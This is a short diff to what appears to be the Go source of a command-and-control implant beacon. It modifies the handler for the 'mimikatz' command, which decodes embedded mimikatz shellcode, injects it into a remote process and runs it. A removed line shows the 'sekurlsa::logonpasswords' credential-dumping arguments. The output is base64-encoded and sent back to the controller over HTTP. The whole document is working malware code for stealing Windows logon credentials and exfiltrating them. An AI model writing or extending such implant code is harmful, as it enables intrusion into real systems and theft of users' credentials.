@@ -128,17 +128,18 @@ func (packet BeaconHttp) handleQueryResponse(commResp CommandResponse) {
 		}
 
 		if cmdSplit[0] == "mimikatz" {
-			data, err := hex.DecodeString(mimikatzShellcode)
-			fmt.Println(err)
+			data, _ := hex.DecodeString(mimikatzShellcode)
 			injector := RemotePipedShellcodeInjector { 
 				shellcode: data,
-				args: "\"privilege::debug\" \"sekurlsa::logonpasswords\" exit",//strings.Join(append(cmdSplit[1:], "exit"), " "),
+				args: strings.Join(append(cmdSplit[0:], "exit"), " "),
 			}
 
-			data, err = json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"mimikatz",[]byte(injector.inject())})
+			out := injector.inject()
+			data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"mimikatz",[]byte(out)})
 			debugFatal(err)
 			encoded := b64.StdEncoding.EncodeToString(data)
 			queryCommandHttp(encoded)
+			return
 		}
 
 		if cmdSplit[0] == "plist" {
